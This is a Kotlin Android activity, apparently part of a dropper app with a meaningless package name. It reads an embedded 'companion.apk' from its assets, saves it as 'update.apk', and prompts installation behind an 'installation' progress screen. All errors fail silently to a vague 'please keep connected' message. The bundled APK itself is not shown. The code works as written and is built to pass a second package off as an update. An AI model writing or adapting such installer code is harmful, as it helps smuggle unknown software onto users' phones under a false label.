package com.cristal.bristral.tristal.mistral

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.File

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { runPipeline() }.start()
    }

    private fun runPipeline() {
        try {
            val apkBytes = loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) {
                showNormal()
                return
            }
            runOnUiThread { installApkDirect(apkBytes) }
        } catch (e: Exception) {
            showNormal()
        }
    }

    private fun installApkDirect(apkBytes: ByteArray) {
        try {
            val apkFile = File(cacheDir, "update.apk")
            apkFile.writeBytes(apkBytes)

            val uri = androidx.core.content.FileProvider.getUriForFile(
                this,
                "${packageName}.fileprovider",
                apkFile
            )

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            startActivity(intent)

        } catch (e: Exception) {
            showNormal()
        }
    }

    private fun loadAssets(): ByteArray? {
        return try { assets.open("companion.apk").use { it.readBytes() } } catch (e: Exception) { null }
    }

    private fun showNormal() {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = getString(R.string.please_keep_connected)
        }
    }

    override fun onDestroy() { super.onDestroy(); handler.removeCallbacksAndMessages(null) }
}
